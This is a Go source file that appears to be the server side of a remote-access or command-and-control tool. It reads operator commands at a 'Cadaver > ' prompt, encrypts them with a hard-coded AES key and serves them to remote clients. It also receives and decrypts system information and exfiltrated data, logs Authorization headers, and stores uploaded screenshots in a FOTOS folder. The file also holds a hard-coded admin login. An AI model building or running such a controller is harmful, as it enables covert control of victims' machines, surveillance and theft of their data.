package router

import (
	"bufio"
	_ "bufio"
	"encoding/base64"
	_ "encoding/base64"
	"fmt"
	_ "fmt"
	_ "github.com/3xploit666/AesGo"
	aesgo "github.com/3xploit666/AesGo"
	"github.com/fatih/color"
	_ "github.com/fatih/color"
	"github.com/labstack/echo/v4"
	_ "github.com/labstack/echo/v4"
	"github.com/olekukonko/tablewriter"
	_ "github.com/olekukonko/tablewriter"
	"hello/main/ejercicio13/helpers"
	_ "hello/main/ejercicio13/helpers"
	"io/ioutil"
	_ "io/ioutil"
	"net/http"
	_ "net/http"
	"os"
	_ "os"
)

const key = "5345435454535"

func Info(c echo.Context) error {
	var body []byte

	if c.Request().Body != nil {
		body, _ = ioutil.ReadAll(c.Request().Body)
		dec := aesgo.DecryptAes(string(body), key)
		//color.Blue(string(dec))
		data := [][]string{
			{dec},
		}
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"sistema"})
		for _, v := range data {
			table.Append(v)
		}
		table.Render()
	}

	return nil
}

func Loc(c echo.Context) error {
	fmt.Println(c.Request().Header.Get("Authorization"))
	return c.String(http.StatusOK, "ok")
}

func Auth(username, password string, c echo.Context) (bool, error) {
	if username != "ADMIN" || password != "1223" {
		return false, nil
	}
	return true, nil
}

func Controller(c echo.Context) error {

	//fmt.Println(c.Request().Header.Get("Authorization"))
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Cadaver > ")
	comando, _ := reader.ReadString('\n')
	cifrado := aesgo.EncryptAes(comando, key)

	color.Red("Waiting Commands!")

	return c.String(http.StatusOK, cifrado)
}
func Enviodatospost(c echo.Context) error {

	var body []byte

	if c.Request().Body != nil {
		body, _ = ioutil.ReadAll(c.Request().Body)

		dec := aesgo.DecryptAes(string(body), key)
		color.Blue(string(dec))
	}
	return nil

}
func Send(c echo.Context) error {

	reqbody, err := ioutil.ReadAll(c.Request().Body)
	helpers.Checkerror(err)
	recover()
	output := aesgo.DecryptAes(string(reqbody), key)
	fmt.Println(output)
	return c.String(http.StatusOK, "Ok")
}

func Capture(c echo.Context) error {
	reqbody, err := ioutil.ReadAll(c.Request().Body)
	helpers.Checkerror(err)
	recover()
	imgfile, err := base64.StdEncoding.DecodeString(string(reqbody))
	helpers.Checkerror(err)
	recover()
	emptyfile, err := ioutil.TempFile("./FOTOS", "fotos*.png")
	helpers.Checkerror(err)
	recover()
	emptyfile.Write(imgfile)
	defer emptyfile.Close()
	return c.String(http.StatusOK, "Recibido!")
}
